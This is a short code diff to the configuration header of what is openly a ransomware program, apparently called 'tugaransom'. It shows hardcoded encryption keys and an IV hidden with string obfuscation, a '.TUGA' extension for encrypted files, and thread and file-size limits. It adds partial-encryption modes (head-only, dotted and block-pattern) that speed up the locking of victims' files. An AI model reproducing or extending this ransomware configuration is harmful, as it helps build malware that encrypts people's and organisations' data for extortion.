@@ -16,7 +16,7 @@
 
 //global variables
 
-/* crypto settings */
+/* crypt settings */
 #define IV				(string)skCrypt("_bestransistuga")					// constant iv of decrytpion & encryption
 #define KEY				(string)skCrypt("ransomtugaISthebesthereactually!")	// constant key of decryption & encryption
 #define KEYOFKEY		(string)skCrypt("tugaransomISthebesthereactually!")	// constant key of decryption & encryption of the key in the file
@@ -24,6 +24,11 @@
 #define MAX_THREADS		20													// maximum number of threads used during decryption & encryption
 #define MAX_FILE_SIZE	2000000000											// maximum file size in bytes (0 for none)
 #define FILE_EXTENSION	(string)skCrypt(".TUGA")							// encrypted files' extension
+#define ENCRYPTION_MODE	(string)skCrypt("AdvancedSmartPattern")				// encryption mode (HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern, Full/default)
+#define HEAD_BYTES		10													// first bytes of the file to be encrypted (for HeadOnly, DotPattern, SmartPattern, AdvancedSmartPattern)
+#define STEP_BYTES		10													// bytes step (for DotPattern)
+#define PERCENT_BLOCK	75													// percentage of bytes encrypted for each block (for SmartPattern and AdvancedSmartPattern)
+#define NUM_BLOCKS		20													// number of equally sized blocks (for AdvancedSmartPattern)
 
 /* files path */
 #define DEBUG_FOLDER	(string)skCrypt(".\\debugFolder\\")							// directory where files are encrypted in debug mode if no arguments are provided
